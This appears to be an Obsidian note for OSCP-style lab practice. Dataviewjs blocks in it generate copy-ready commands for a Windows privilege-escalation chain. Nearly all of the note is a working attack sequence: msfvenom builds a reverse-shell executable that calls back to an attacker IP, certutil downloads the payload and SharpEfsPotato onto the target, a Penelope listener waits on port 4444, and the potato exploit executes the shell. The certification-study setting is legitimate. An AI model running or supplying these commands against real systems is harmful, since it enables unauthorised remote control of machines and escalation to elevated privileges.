# Quick setup

Prepare shell.exe (msfvenom) Port 4444 + SharpEfsPotato and Serve on server
```dataviewjs
const command = `msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.45.186 -f exe -o shell.exe && python -m http.server 80 && cp ~/Desktop/Tools/Windows/SharpEfsPotato.exe . && python -m http.server 80`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```



---

# Full Method

```
python -m http.server 80 --directory ~/Desktop/Tools/Windows
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -f -urlcache -split http://${KaliIP}/SharpEfsPotato.exe SharpEfsPotato.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Generate MSFvenom payload
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=${KaliIP} -f exe -o shell.exe && python -m http.server 80`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
python -m http.server 80
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -f -urlcache -split http://${KaliIP}/shell.exe shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Start Penelope Listener

```
cd ~/Desktop/Tools/ && python3 penelope.py -p 4444
```
#### Run
```
./SharpEfsPotato.exe -p shell.exe
```
